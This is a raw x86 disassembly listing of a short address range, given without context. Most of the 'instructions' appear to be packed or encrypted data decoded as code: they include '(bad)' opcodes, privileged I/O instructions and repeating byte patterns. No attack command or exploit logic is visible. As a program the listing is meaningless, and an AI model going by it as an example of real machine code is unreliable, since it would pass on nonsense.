  41d98b:	inc    eax
  41d98c:	add    BYTE PTR [edx+0x5],ah
  41d98f:	inc    eax
  41d990:	adc    BYTE PTR [edx+0x40],ah
  41d993:	inc    ebx
  41d994:	inc    ecx
  41d995:	add    eax,0x4340
  41d99a:	add    eax,0x404162
  41d99f:	add    BYTE PTR [eax+0x43],al
  41d9a2:	inc    eax
  41d9a3:	add    eax,0x349422ef
  41d9a8:	push   ebx
  41d9a9:	push   eax
  41d9aa:	inc    eax
  41d9ab:	inc    ecx
  41d9ac:	xor    edx,DWORD PTR [ecx+0x35df651c]
  41d9b2:	inc    eax
  41d9b3:	std    
  41d9b4:	inc    ebp
  41d9b5:	bound  esp,QWORD PTR [esi]
  41d9b7:	push   0x54c80b5
  41d9bc:	ror    ebx,0x62
  41d9bf:	ins    BYTE PTR es:[edi],dx
  41d9c0:	lods   eax,DWORD PTR ds:[esi]
  41d9c1:	lds    eax,FWORD PTR [eax+0x40]
  41d9c4:	jge    0x41d9d8
  41d9c6:	adc    ah,BYTE PTR [ebp+0x62]
  41d9c9:	inc    ecx
  41d9ca:	inc    eax
  41d9cb:	xor    ebx,eax
  41d9cd:	dec    esp
  41d9ce:	mov    eax,0x4058e6fc
  41d9d3:	pop    ss
  41d9d4:	inc    eax
  41d9d5:	add    BYTE PTR [eax],al
  41d9d7:	inc    ecx
  41d9d8:	inc    ebx
  41d9d9:	add    eax,0x41784062
  41d9de:	inc    eax
  41d9df:	inc    eax
  41d9e0:	add    BYTE PTR [edi],cl
  41d9e2:	bound  eax,QWORD PTR [ebx+0x0]
  41d9e5:	add    eax,0x25006240
  41d9ea:	inc    eax
  41d9eb:	add    eax,0x40254143
  41d9f0:	add    eax,0xd9620000
  41d9f5:	xlat   BYTE PTR ds:[ebx]
  41d9f6:	loopne 0x41da4c
  41d9f8:	clc    
  41d9f9:	enter  0x4158,0xc7
  41d9fd:	mov    ds:0x623c5226,eax
  41da02:	inc    eax
  41da03:	dec    ebx
  41da04:	retf   
  41da05:	outs   dx,BYTE PTR ds:[si]
  41da07:	inc    ebp
  41da08:	int3   
  41da09:	cmp    DWORD PTR [ebx+0x0],eax
  41da0c:	add    BYTE PTR [eax],al
  41da0e:	inc    ecx
  41da0f:	inc    eax
  41da10:	bound  esp,QWORD PTR [esi+0x0]
  41da13:	inc    eax
  41da14:	add    eax,0x5400000
  41da19:	inc    ecx
  41da1a:	inc    eax
  41da1b:	inc    eax
  41da1c:	bound  esp,QWORD PTR ds:0x25050043
  41da22:	inc    ecx
  41da23:	inc    ebx
  41da24:	inc    eax
  41da25:	test   BYTE PTR [eax+0x0],al
  41da28:	bound  ebx,QWORD PTR [eax+0x62]
  41da2b:	inc    ecx
  41da2c:	inc    eax
  41da2d:	inc    eax
  41da2e:	inc    eax
  41da2f:	lds    eax,FWORD PTR [ebp+0x49]
  41da32:	jl     0x41da97
  41da34:	test   al,0x40
  41da36:	xor    ebp,DWORD PTR ds:0xc243c538
  41da3c:	bound  edx,QWORD PTR [esi+esi*1-0x3e]
  41da40:	push   ss
  41da41:	je     0x41daa3
  41da43:	adc    BYTE PTR [edx+0x40],ah
  41da46:	inc    ecx
  41da47:	and    eax,0x40000500
  41da4c:	inc    ebx
  41da4d:	add    eax,0x40624041
  41da52:	inc    ebx
  41da53:	add    eax,0x43402541
  41da58:	bound  eax,QWORD PTR [eax+0x43]
  41da5b:	int3   
  41da5c:	inc    eax
  41da5d:	bound  eax,QWORD PTR [eax]
  41da5f:	inc    ecx
  41da60:	inc    eax
  41da61:	inc    eax
  41da62:	add    eax,0x40332005
  41da67:	inc    eax
  41da68:	xor    ch,BYTE PTR [eax+0x730bac34]
  41da6e:	inc    eax
  41da6f:	sub    BYTE PTR [esi],al
  41da71:	adc    BYTE PTR [edi-0x3d],cl
  41da74:	xchg   esp,eax
  41da75:	addr16 inc eax
  41da77:	inc    eax
  41da78:	ret    0xb6bc
  41da7b:	icebp  
  41da7c:	bound  esp,QWORD PTR ds:0x413df450
  41da82:	pop    edx
  41da83:	fisub  WORD PTR [edx+0x40]
  41da86:	and    eax,0x5406600
  41da8b:	inc    ebx
  41da8c:	inc    ecx
  41da8d:	inc    eax
  41da8e:	inc    eax
  41da8f:	inc    ebx
  41da90:	add    BYTE PTR [eax],al
  41da92:	add    BYTE PTR [edx-0x34],ah
  41da95:	inc    eax
  41da96:	add    eax,0x40004041
  41da9b:	inc    ecx
  41da9c:	int3   
  41da9d:	add    BYTE PTR [ebx-0x7c],al
  41daa0:	add    eax,0x5406240
  41daa5:	bound  ecx,QWORD PTR ds:0x33234062
  41daab:	xor    ebp,DWORD PTR [eax+ebx*4]
  41daae:	gs xor al,0x40
  41dab1:	cs jecxz 0x41da38
  41dab4:	pop    esi
  41dab5:	mov    ah,0x31
  41dab7:	sub    BYTE PTR [eax+0x41],al
  41daba:	lds    esp,FWORD PTR [edx-0x68]
  41dabd:	ins    BYTE PTR es:[edi],dx
  41dabe:	push   edi
  41dabf:	arpl   WORD PTR [esi+eax*2+0x40],cx
  41dac3:	bound  ebx,QWORD PTR [eax+0x41]
  41dac6:	add    eax,0x40404340
  41dacb:	inc    ebx
  41dacc:	inc    eax
  41dacd:	test   BYTE PTR [eax],al
  41dacf:	add    eax,0x40624041
  41dad4:	inc    eax
  41dad5:	add    BYTE PTR [edx+0x5],ah
  41dad8:	inc    ebx
  41dad9:	add    BYTE PTR [eax+0x78],al
  41dadc:	inc    ecx
  41dadd:	add    BYTE PTR [eax+0x41],bl
  41dae0:	(bad)  
  41dae1:	ficom  WORD PTR [eax]
  41dae3:	dec    ecx
  41dae4:	fisttp QWORD PTR [ebx-0x57]
  41dae7:	inc    eax
  41dae8:	inc    eax
  41dae9:	(bad)  
  41daea:	int3   
  41daeb:	out    0x98,al
  41daed:	and    eax,0x2caa40a8
  41daf2:	sub    BYTE PTR [eax+0x40422148],bl
  41daf8:	inc    eax
  41daf9:	orps   xmm0,XMMWORD PTR [ecx-0x37]
  41dafd:	add    al,0x2a
  41daff:	dec    eax
  41db00:	sub    eax,0xa86534c0
  41db05:	push   ebx
  41db06:	adc    BYTE PTR [eax+0x4a],al
  41db09:	and    DWORD PTR [eax+ebp*2],ebx
  41db0c:	or     eax,0x4040b8f6
  41db11:	jno    0x41db53
  41db13:	test   BYTE PTR [eax],al
  41db15:	int3   
  41db16:	bound  eax,QWORD PTR ds:0xcc840f41
  41db1c:	inc    ebx
  41db1d:	add    BYTE PTR [eax+0x0],al
  41db20:	inc    eax
  41db21:	inc    eax
  41db22:	inc    eax
  41db23:	int3   
  41db24:	add    BYTE PTR ds:0x62404341,al
  41db2a:	pop    eax
  41db2b:	add    BYTE PTR [ebx+0x40],al
  41db2e:	bound  ecx,QWORD PTR [edi]
  41db30:	inc    eax
  41db31:	mov    edx,0x43a8cb98
  41db36:	inc    eax
  41db37:	and    ebp,eax
  41db39:	ret    
  41db3a:	add    eax,0x4467045c
  41db3f:	and    ah,BYTE PTR [edi]
  41db41:	mov    esi,0x90aa43c9
  41db46:	inc    eax
  41db47:	and    al,bl
  41db49:	add    DWORD PTR [esp+ebp*2+0x42406262],ebx
  41db50:	sub    eax,DWORD PTR [eax]
  41db52:	add    BYTE PTR [eax+0x40],al
  41db55:	cmovno eax,DWORD PTR ds:0x40056243
  41db5c:	int3   
  41db5d:	add    ah,cl
  41db5f:	inc    eax
  41db60:	inc    eax
  41db61:	bound  eax,QWORD PTR [ecx+0x0]
  41db64:	add    BYTE PTR [edi],cl
  41db66:	inc    ebx
  41db67:	inc    eax
  41db68:	inc    eax
  41db69:	add    BYTE PTR [ecx+0x43],al
  41db6c:	add    eax,0x40256240
  41db71:	bound  eax,QWORD PTR [eax]
  41db73:	adc    al,0x5
  41db75:	test   BYTE PTR [esi+0x40],ah
  41db78:	and    al,0x34
  41db7a:	out    dx,al
  41db7b:	test   ebx,0x6520b462
  41db81:	push   ds
  41db82:	ret    0x944f
  41db85:	mov    esp,0x4260b562
  41db8a:	aaa    
  41db8b:	dec    eax
  41db8c:	adc    eax,0x7a62e721
  41db91:	or     BYTE PTR [di],0xc9
  41db95:	adc    DWORD PTR [eax],ebp
  41db97:	add    eax,0xcbc34028
  41db9c:	mov    al,0x63
  41db9e:	cmp    eax,DWORD PTR [edi+0x4df50334]
  41dba4:	adc    eax,0x2775c857
  41dba9:	add    eax,0x4140cc00
  41dbae:	inc    eax
  41dbaf:	inc    ebx
  41dbb0:	bound  esp,QWORD PTR ds:0x41400043
  41dbb6:	add    BYTE PTR [eax],al
  41dbb8:	add    eax,0x43624062
  41dbbd:	inc    ecx
  41dbbe:	inc    eax
  41dbbf:	inc    eax
  41dbc0:	inc    eax
  41dbc1:	add    eax,0x40624340
  41dbc6:	add    eax,0x40664140
  41dbcb:	inc    eax
  41dbcc:	rol    DWORD PTR [esi+0x6b],0x34
  41dbd0:	bound  edx,QWORD PTR [edx-0x7bcb5d2]
  41dbd6:	in     al,0x9d
  41dbd8:	jae    0x41dc3c
  41dbda:	and    eax,0x1544c0e0
  41dbdf:	xor    bh,BYTE PTR [edi-0x78]
  41dbe2:	or     al,0x40
  41dbe4:	and    al,0xa8
  41dbe6:	retf   
  41dbe7:	(bad)  
  41dbe8:	stc    
  41dbe9:	ins    DWORD PTR es:[di],dx
  41dbeb:	dec    ebp
  41dbec:	imul   edx,DWORD PTR [eax],0xffffffe4
  41dbef:	pop    ebp
  41dbf0:	bound  ebx,QWORD PTR [esp+esi*1+0xd63c540]
  41dbf7:	xor    al,0xe7
  41dbf9:	fs cs ins BYTE PTR es:[edi],dx
  41dbfc:	neg    DWORD PTR [edi]
  41dbfe:	leave  
  41dbff:	dec    eax
  41dc00:	int3   
  41dc01:	xchg   DWORD PTR ds:0x500433a,esp
  41dc07:	inc    eax
  41dc08:	js     0x41dc1a
  41dc0a:	inc    ecx
  41dc0b:	bound  eax,QWORD PTR [eax+0x40]
  41dc0e:	sldt   WORD PTR [eax-0x34]
  41dc12:	js     0x41dc76
  41dc14:	add    eax,0x40664143
  41dc19:	inc    ebx
  41dc1a:	add    BYTE PTR [ecx+0x5],al
  41dc1d:	js     0x41dc5f
  41dc1f:	bound  eax,QWORD PTR [eax+0x0]
  41dc22:	inc    eax
  41dc23:	ret    0x5052
  41dc26:	add    eax,0x423440c2
  41dc2b:	sti    
  41dc2c:	sbb    cl,BYTE PTR [eax]
  41dc2e:	jnp    0x41dbd8
  41dc30:	and    BYTE PTR [esi],ch
  41dc32:	and    al,0x33
  41dc34:	add    BYTE PTR [ebx-0x44],al
  41dc37:	adc    DWORD PTR [edx+0x2f],edx
  41dc3a:	inc    eax
  41dc3b:	add    DWORD PTR [ebx-0x78],esp
  41dc3e:	inc    ebx
  41dc3f:	mov    esp,0x43410362
  41dc44:	inc    eax
  41dc45:	inc    eax
  41dc46:	add    eax,0x434162
  41dc4b:	inc    eax
  41dc4c:	add    BYTE PTR [edx+0x5],ah
  41dc4f:	inc    eax
  41dc50:	adc    BYTE PTR [edx+0x40],ah
  41dc53:	inc    ebx
  41dc54:	inc    ecx
  41dc55:	add    eax,0x4340
  41dc5a:	add    eax,0x404162
  41dc5f:	add    BYTE PTR [eax+0x43],al
  41dc62:	inc    eax
  41dc63:	add    eax,0xdd0c132
  41dc68:	mov    ch,0x41
  41dc6a:	add    eax,0xcb004840
  41dc6f:	inc    ebp
  41dc70:	pusha  
  41dc71:	popa   
  41dc72:	xchg   DWORD PTR [edx+0x22],ecx
  41dc75:	sar    BYTE PTR [edi+0x16185340],0x4d
  41dc7c:	inc    eax
  41dc7d:	xor    eax,0x647405be
  41dc82:	pusha  
  41dc83:	and    eax,0x249fcb27
  41dc88:	test   eax,0x563341e6
  41dc8d:	(bad)  
  41dc8e:	lds    ebx,FWORD PTR [ebx-0x58]
  41dc91:	sub    al,0x7d
  41dc93:	das    
  41dc94:	inc    edx
  41dc95:	aaa    
  41dc96:	inc    ebx
  41dc97:	xor    al,0x40
  41dc99:	add    BYTE PTR [eax],al
  41dc9b:	inc    ecx
  41dc9c:	inc    ebx
  41dc9d:	add    eax,0x41784062
  41dca2:	inc    eax
  41dca3:	inc    eax
  41dca4:	add    BYTE PTR [edi],cl
  41dca6:	bound  eax,QWORD PTR [ebx+0x0]
  41dca9:	add    eax,0x25006240
  41dcae:	inc    eax
  41dcaf:	add    eax,0x40254143
  41dcb4:	add    eax,0x15620000
  41dcb9:	or     ebx,esp
  41dcbb:	sub    al,0x60
  41dcbd:	xor    al,0x3c
  41dcbf:	pushf  
  41dcc0:	inc    ecx
  41dcc1:	xor    al,0x95
  41dcc3:	and    esi,DWORD PTR [esi-0x36]
  41dcc6:	mov    al,ds:0x30655115
  41dccb:	pusha  
  41dccc:	inc    eax
  41dccd:	ins    BYTE PTR es:[edi],dx
  41dcce:	bound  edi,QWORD PTR [ebx+0x34]
  41dcd1:	es mov esp,0xcb2a2f7a
  41dcd7:	mov    al,0x52
  41dcd9:	bound  eax,QWORD PTR ds:0x432e
  41dcdf:	add    BYTE PTR [ecx+0x40],al
  41dce2:	bound  esp,QWORD PTR [esi+0x0]
  41dce5:	inc    eax
  41dce6:	add    eax,0x5400000
  41dceb:	inc    ecx
  41dcec:	inc    eax
  41dced:	inc    eax
  41dcee:	bound  esp,QWORD PTR ds:0x25050043
  41dcf4:	inc    ecx
  41dcf5:	inc    ebx
  41dcf6:	inc    eax
  41dcf7:	test   BYTE PTR [eax+0x0],al
  41dcfa:	bound  ebx,QWORD PTR [eax+0x62]
  41dcfd:	inc    ecx
  41dcfe:	inc    eax
  41dcff:	inc    eax
  41dd00:	inc    eax
  41dd01:	addr16 adc eax,0x2f405bcd
  41dd07:	pusha  
  41dd08:	and    DWORD PTR ds:0x922454cb,esi
  41dd0e:	sub    eax,ebp
  41dd10:	add    eax,0x10643828
  41dd15:	imul   esi,DWORD PTR [esp+ebp*2],0xffffffc2
  41dd19:	pop    ds
  41dd1a:	xor    eax,0x233dc44d
  41dd1f:	inc    eax
  41dd20:	and    al,0x1d
  41dd22:	inc    esp
  41dd23:	enter  0xc53,0x25
  41dd27:	xor    dl,BYTE PTR [esi]
  41dd29:	mov    ax,0x6210
  41dd2d:	inc    eax
  41dd2e:	inc    ecx
  41dd2f:	and    eax,0x40000500
  41dd34:	inc    ebx
  41dd35:	add    eax,0x40624041
  41dd3a:	inc    ebx
  41dd3b:	add    eax,0x43402541
  41dd40:	bound  eax,QWORD PTR [eax+0x43]
  41dd43:	int3   
  41dd44:	inc    eax
  41dd45:	bound  eax,QWORD PTR [eax]
  41dd47:	inc    ecx
  41dd48:	inc    eax
  41dd49:	inc    eax
  41dd4a:	add    eax,0x631fea05
  41dd4f:	cs in  al,0xc1
  41dd52:	inc    ebx
  41dd53:	cmp    eax,0x2ed5a8e9
  41dd58:	inc    eax
  41dd59:	push   eax
  41dd5a:	enter  0xa8c3,0x11
  41dd5e:	test   al,0x2f
  41dd60:	sub    al,0xc3
  41dd62:	outs   dx,BYTE PTR ds:[esi]
  41dd63:	adc    BYTE PTR ds:[edx+edx*1+0x3],al
  41dd68:	test   BYTE PTR [edi+0x4e],ch
  41dd6b:	xor    al,0x41
  41dd6d:	inc    ecx
  41dd6e:	dec    eax
  41dd6f:	inc    eax
  41dd70:	inc    ecx
  41dd71:	rcr    DWORD PTR [ebp+ecx*2-0x4a],0xe
  41dd76:	inc    ecx
  41dd77:	inc    eax
  41dd78:	sub    al,0x4b
  41dd7a:	bound  eax,QWORD PTR [eax+0x25]
  41dd7d:	add    BYTE PTR [esi+0x40],ah
  41dd80:	add    eax,0x40404143
  41dd85:	inc    ebx
  41dd86:	add    BYTE PTR [eax],al
  41dd88:	add    BYTE PTR [edx-0x34],ah
  41dd8b:	inc    eax
  41dd8c:	add    eax,0x40004041
  41dd91:	inc    ecx
  41dd92:	int3   
  41dd93:	add    BYTE PTR [ebx-0x7c],al
  41dd96:	add    eax,0x5406240
  41dd9b:	bound  ecx,QWORD PTR [esi+0x66807040]
  41dda1:	inc    eax
  41dda2:	inc    ecx
  41dda3:	rcl    BYTE PTR [ebx-0x74],0x52
  41dda7:	bound  eax,QWORD PTR [eax+eax*2]
  41ddaa:	outs   dx,DWORD PTR fs:[esi]
  41ddac:	int    0x6b
  41ddae:	xor    al,0x66
  41ddb0:	gs dec edx
  41ddb2:	inc    eax
  41ddb3:	sub    al,0x41
  41ddb5:	bound  ecx,QWORD PTR [eax+0x24]
  41ddb8:	inc    eax
  41ddb9:	dec    ebp
  41ddba:	ins    BYTE PTR es:[edi],dx
  41ddbb:	jp     0x41ddfd
  41ddbd:	bound  ebx,QWORD PTR [eax+0x41]
  41ddc0:	add    eax,0x40404340
  41ddc5:	inc    ebx
  41ddc6:	inc    eax
  41ddc7:	test   BYTE PTR [eax],al
  41ddc9:	add    eax,0x40624041
  41ddce:	inc    eax
  41ddcf:	add    BYTE PTR [edx+0x5],ah
  41ddd2:	inc    ebx
  41ddd3:	add    BYTE PTR [eax+0x78],al
  41ddd6:	inc    ecx
  41ddd7:	add    BYTE PTR [eax+0x41],bl
  41ddda:	(bad)  
  41dddb:	cmc    
  41dddc:	test   al,0x15
  41ddde:	and    BYTE PTR fs:0xed7bc1ee,ah
  41dde5:	enter  0x6f04,0x36
  41dde9:	inc    eax
  41ddea:	jno    0x41dd94
  41ddec:	fisubr WORD PTR [edi+0x38290148]
  41ddf2:	shr    DWORD PTR [esi],0x88
  41ddf5:	bound  ebp,QWORD PTR [eax-0x58]
  41ddf8:	sub    al,0x40
  41ddfa:	imul   ecx,edx,0x15
  41ddfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddfe:	outs   dx,BYTE PTR ds:[esi]
  41ddff:	inc    ecx
  41de00:	add    DWORD PTR ds:0x74cd62c2,esi
  41de06:	mov    ah,0x2a
  41de08:	ins    DWORD PTR es:[edi],dx
  41de09:	inc    eax
  41de0a:	and    DWORD PTR [eax+0x11626244],esi
  41de10:	xor    BYTE PTR ds:0x432a4837,ah
  41de16:	jo     0x41de60
  41de18:	inc    eax
  41de19:	test   BYTE PTR [eax],al
  41de1b:	int3   
  41de1c:	bound  eax,QWORD PTR ds:0xcc840f41
  41de22:	inc    ebx
  41de23:	add    BYTE PTR [eax+0x0],al
  41de26:	inc    eax
  41de27:	inc    eax
  41de28:	inc    eax
  41de29:	int3   
  41de2a:	add    BYTE PTR ds:0x62404341,al
  41de30:	pop    eax
  41de31:	add    BYTE PTR [ebx+0x40],al
  41de34:	bound  ecx,QWORD PTR [edi]
  41de36:	inc    eax
  41de37:	and    eax,0x42edc264
  41de3c:	cmp    BYTE PTR [ebp+ecx*1+0x32604025],bh
  41de43:	inc    edi
  41de44:	lahf   
  41de45:	arpl   WORD PTR [ebx+ecx*1+0x23],ax
  41de49:	ss or  esp,ebp
  41de4c:	test   al,0x0
  41de4e:	arpl   WORD PTR [eax+0x0],sp
  41de51:	add    BYTE PTR [eax+0x40],al
  41de54:	cmovno eax,DWORD PTR ds:0x40056243
  41de5b:	int3   
  41de5c:	add    ah,cl
  41de5e:	inc    eax
  41de5f:	inc    eax
  41de60:	bound  eax,QWORD PTR [ecx+0x0]
  41de63:	add    BYTE PTR [edi],cl
  41de65:	inc    ebx
  41de66:	inc    eax
  41de67:	inc    eax
  41de68:	add    BYTE PTR [ecx+0x43],al
  41de6b:	add    eax,0x40256240
  41de70:	bound  eax,QWORD PTR [eax]
  41de72:	inc    edx
  41de73:	sar    BYTE PTR [ebx],0xed
  41de76:	adc    BYTE PTR [edx-0x74],dh
  41de79:	jp     0x41debb
  41de7b:	xor    eax,0x154acfe
  41de80:	addr16 cs and eax,0x562622f
  41de87:	addr16 popa 
  41de89:	das    
  41de8a:	enter  0x7b68,0xc5
  41de8e:	inc    ebx
  41de8f:	add    ch,BYTE PTR [ecx+ebp*1+0x42]
  41de93:	shl    BYTE PTR [eax*1+0x4140cc00],0x40
  41de9b:	inc    ebx
  41de9c:	bound  esp,QWORD PTR ds:0x41400043
  41dea2:	add    BYTE PTR [eax],al
  41dea4:	add    eax,0x43624062
  41dea9:	inc    ecx
  41deaa:	inc    eax
  41deab:	inc    eax
  41deac:	inc    eax
  41dead:	add    eax,0x40624340
  41deb2:	add    eax,0x40664140
  41deb7:	dec    edi
  41deb8:	inc    ebx
  41deb9:	mov    ah,0x62
  41debb:	xor    al,0x60
  41debd:	pusha  
  41debe:	fimul  DWORD PTR [eax+esi*4+0x62]
  41dec2:	dec    ecx
  41dec3:	and    edi,DWORD PTR [eax]
  41dec5:	add    dl,BYTE PTR [edx]
  41dec7:	add    ch,ah
  41dec9:	push   es
  41deca:	and    BYTE PTR ds:0x7b31c040,ah
  41ded0:	inc    ebx
  41ded1:	add    BYTE PTR ds:0x41107840,al
  41ded7:	bound  eax,QWORD PTR [eax+0x40]
  41deda:	sldt   WORD PTR [eax-0x34]
  41dede:	js     0x41df42
  41dee0:	add    eax,0x40664143
  41dee5:	inc    ebx
  41dee6:	add    BYTE PTR [ecx+0x5],al
  41dee9:	js     0x41df2b
  41deeb:	bound  eax,QWORD PTR [eax+0x0]
  41deee:	inc    eax
  41deef:	dec    ebp
  41def0:	push   eax
  41def1:	mov    esi,0x2f09252e
  41def6:	inc    edx
  41def7:	mov    WORD PTR [edx+0x1a],fs
  41defa:	cs dec eax
  41defc:	dec    ebx
  41defd:	fdivr  st(0),st
  41deff:	xchg   esi,eax
  41df00:	jl     0x41deaa
  41df02:	das    
  41df03:	inc    eax
  41df04:	into   
  41df05:	imul   ebp,esp,0xffffff88
  41df08:	je     0x41df4c
  41df0a:	add    ebp,DWORD PTR [esi+edi*2]
  41df0d:	pop    edi
  41df0e:	bound  edx,QWORD PTR [edx+0x65]
  41df11:	sub    al,BYTE PTR [eax+0x6a]
  41df14:	inc    eax
  41df15:	cmp    BYTE PTR [ebp+0x61],ah
  41df18:	cmp    BYTE PTR [edx+0x40],al
  41df1b:	inc    eax
  41df1c:	adc    al,0x41
  41df1e:	inc    ebx
  41df1f:	inc    eax
  41df20:	inc    eax
  41df21:	add    eax,0x434162
  41df26:	inc    eax
  41df27:	add    BYTE PTR [edx+0x5],ah
  41df2a:	inc    eax
  41df2b:	adc    BYTE PTR [edx+0x40],ah
  41df2e:	inc    ebx
  41df2f:	inc    ecx
  41df30:	add    eax,0x4340
  41df35:	add    eax,0x404162
  41df3a:	add    BYTE PTR [eax+0x43],al
  41df3d:	inc    eax
  41df3e:	add    eax,0x1494cc16
  41df43:	fs inc eax
  41df45:	sub    DWORD PTR [edx],esi
  41df47:	pushf  
  41df48:	out    dx,al
  41df49:	sbb    eax,0x704a0c63
  41df4e:	push   ebx
  41df4f:	cmp    eax,0x6265be68
  41df54:	dec    ebp
  41df55:	inc    eax
  41df56:	add    BYTE PTR [eax],al
  41df58:	inc    ecx
  41df59:	inc    ebx
  41df5a:	add    eax,0x41784062
  41df5f:	inc    eax
  41df60:	inc    eax
  41df61:	add    BYTE PTR [edi],cl
  41df63:	bound  eax,QWORD PTR [ebx+0x0]
  41df66:	add    eax,0x25006240
  41df6b:	inc    eax
  41df6c:	add    eax,0x40254143
  41df71:	add    eax,0x40620000
  41df76:	shl    BYTE PTR [edx+0x9],0x96
  41df7a:	loopne 0x41dfe0
  41df7c:	and    al,0x36
  41df7e:	jl     0x41df92
  41df80:	arpl   WORD PTR [esi],sp
  41df82:	arpl   WORD PTR [eiz*1-0x3937be30],di
  41df89:	push   ebx
  41df8a:	jmp    0xdc61:0x47402466
  41df91:	mov    ah,0xa9
  41df93:	xchg   DWORD PTR [edi],ebp
  41df95:	xor    dl,BYTE PTR [ebp+0x6c]
  41df98:	enter  0xac15,0x3c
  41df9c:	and    eax,DWORD PTR [eax+0x40]
  41df9f:	push   edi
  41dfa0:	inc    ebx
  41dfa1:	add    BYTE PTR [eax],al
  41dfa3:	add    BYTE PTR [ecx+0x40],al
  41dfa6:	bound  esp,QWORD PTR [esi+0x0]
  41dfa9:	inc    eax
  41dfaa:	add    eax,0x5400000
  41dfaf:	inc    ecx
  41dfb0:	inc    eax
  41dfb1:	inc    eax
  41dfb2:	bound  esp,QWORD PTR ds:0x25050043
  41dfb8:	inc    ecx
  41dfb9:	inc    ebx
  41dfba:	inc    eax
  41dfbb:	test   BYTE PTR [eax+0x0],al
  41dfbe:	bound  ebx,QWORD PTR [eax+0x62]
  41dfc1:	inc    ecx
  41dfc2:	inc    eax
  41dfc3:	inc    ebp
  41dfc4:	retf   
  41dfc5:	pop    ecx
  41dfc6:	data16 cs xor al,0x4a
  41dfca:	inc    ebx
  41dfcb:	xor    eax,0x2578af1e
  41dfd0:	push   0xab16e440
  41dfd5:	push   0x68
  41dfd7:	sub    al,0x40
  41dfd9:	dec    ebp
  41dfda:	xchg   ecx,eax
  41dfdb:	test   al,0x64
  41dfdd:	jo     0x41e020
  41dfdf:	xor    ah,BYTE PTR [eax+0x18]
  41dfe2:	cmp    al,0x10
  41dfe4:	pop    ebx
  41dfe5:	cld    
  41dfe6:	lods   al,BYTE PTR ds:[esi]
  41dfe7:	xor    eax,0xb4254040
  41dfec:	push   eax
  41dfed:	push   0x6e336df0
  41dff2:	bound  eax,QWORD PTR [ecx+0x67]
  41dff5:	pop    edx
  41dff6:	test   al,0x2d
  41dff8:	inc    eax
  41dff9:	int    0x41
  41dffb:	ja     0x41e00d
  41dffd:	bound  eax,QWORD PTR [eax+0x41]
  41e000:	and    eax,0x40000500
  41e005:	inc    ebx
  41e006:	add    eax,0x40624041
  41e00b:	inc    ebx
  41e00c:	add    eax,0x43402541
  41e011:	bound  eax,QWORD PTR [eax+0x43]
  41e014:	int3   
  41e015:	inc    eax
  41e016:	bound  eax,QWORD PTR [eax]
  41e018:	inc    ecx
  41e019:	inc    eax
  41e01a:	inc    eax
  41e01b:	add    eax,0x102c1e05
  41e020:	xor    ah,BYTE PTR [ecx]
  41e022:	inc    ecx
  41e023:	hlt    
  41e024:	and    al,0x57
  41e026:	pop    ebx
  41e027:	fs das 
  41e029:	inc    eax
  41e02a:	jnp    0x41e023
  41e02c:	fs add eax,0x30267f88
  41e032:	inc    ecx
  41e033:	int    0x4c
  41e035:	sub    dl,BYTE PTR [edx+eiz*2+0x6d]
  41e039:	inc    eax
  41e03a:	arpl   WORD PTR [edx+0x40],sp
  41e03d:	and    eax,0x5406600
  41e042:	inc    ebx
  41e043:	inc    ecx
  41e044:	inc    eax
  41e045:	inc    eax
  41e046:	inc    ebx
  41e047:	add    BYTE PTR [eax],al
  41e049:	add    BYTE PTR [edx-0x34],ah
  41e04c:	inc    eax
  41e04d:	add    eax,0x40004041
  41e052:	inc    ecx
  41e053:	int3   
  41e054:	add    BYTE PTR [ebx-0x7c],al
  41e057:	add    eax,0x5406240
  41e05c:	bound  ebp,QWORD PTR [eax+0x4c3b630a]
  41e062:	aaa    
  41e063:	test   BYTE PTR [eax+0x10],0xb1
  41e067:	jle    0x41e046
  41e069:	xor    al,0x37
  41e06b:	adc    al,0x28
  41e06d:	inc    edx
  41e06e:	bound  ebx,QWORD PTR [ebx+eax*2]
  41e071:	outs   dx,BYTE PTR ds:[esi]
  41e072:	aaa    
  41e073:	or     esp,DWORD PTR [ecx]
  41e075:	inc    edx
  41e076:	add    ah,BYTE PTR [edx-0x68]
  41e079:	cld    
  41e07a:	ins    DWORD PTR es:[edi],dx
  41e07b:	cmc    
  41e07c:	inc    eax
  41e07d:	bound  ebx,QWORD PTR [eax+0x41]
  41e080:	add    eax,0x40404340
  41e085:	inc    ebx
  41e086:	inc    eax
  41e087:	test   BYTE PTR [eax],al
  41e089:	add    eax,0x40624041
  41e08e:	inc    eax
  41e08f:	add    BYTE PTR [edx+0x5],ah
  41e092:	inc    ebx
  41e093:	add    BYTE PTR [eax+0x78],al
  41e096:	inc    ecx
  41e097:	add    BYTE PTR [eax+0x41],bl
  41e09a:	bound  eax,QWORD PTR [ebx+0x17]
  41e09d:	retf   
  41e09e:	mov    eax,0xfd385369
  41e0a3:	jnp    0x41e025
  41e0a5:	dec    esp
  41e0a6:	xor    BYTE PTR [eax+0x40f56fd6],al
  41e0ac:	bound  edx,QWORD PTR [edi+0x62]
  41e0af:	jae    0x41e0f1
  41e0b1:	cs retf 0x4b7b
  41e0b5:	sub    ebp,DWORD PTR [esi]
  41e0b7:	fist   DWORD PTR [eax-0x339f6cd1]
  41e0bd:	(bad)  
  41e0be:	fs stos DWORD PTR es:[edi],eax
  41e0c0:	outs   dx,BYTE PTR ds:[esi]
  41e0c1:	sub    DWORD PTR [ebx],ecx
  41e0c3:	inc    ecx
  41e0c4:	ins    BYTE PTR es:[edi],dx
  41e0c5:	and    al,0xb5
  41e0c7:	inc    esp
  41e0c8:	mov    ecx,0xab407734
  41e0cd:	mul    BYTE PTR [ebx+ebp*4-0x4d]
  41e0d1:	and    DWORD PTR [ebx+0x2c],ecx
  41e0d4:	mov    ds:0x40bf5ffc,eax
  41e0d9:	test   BYTE PTR [eax],al
  41e0db:	int3   
  41e0dc:	bound  eax,QWORD PTR ds:0xcc840f41
  41e0e2:	inc    ebx
  41e0e3:	add    BYTE PTR [eax+0x0],al
  41e0e6:	inc    eax
  41e0e7:	inc    eax
  41e0e8:	inc    eax
  41e0e9:	int3   
  41e0ea:	add    BYTE PTR ds:0x62404341,al
  41e0f0:	pop    eax
  41e0f1:	add    BYTE PTR [ebx+0x40],al
  41e0f4:	bound  ecx,QWORD PTR [edi]
  41e0f6:	inc    eax
  41e0f7:	test   al,0x23
  41e0f9:	mov    cl,0x55
  41e0fb:	dec    edx
  41e0fc:	inc    ecx
  41e0fd:	xchg   esp,eax
  41e0fe:	mov    BYTE PTR [edx+0x29],al
  41e101:	pop    edi
  41e102:	inc    eax
  41e103:	bound  eax,QWORD PTR [edi-0x14]
  41e106:	ret    
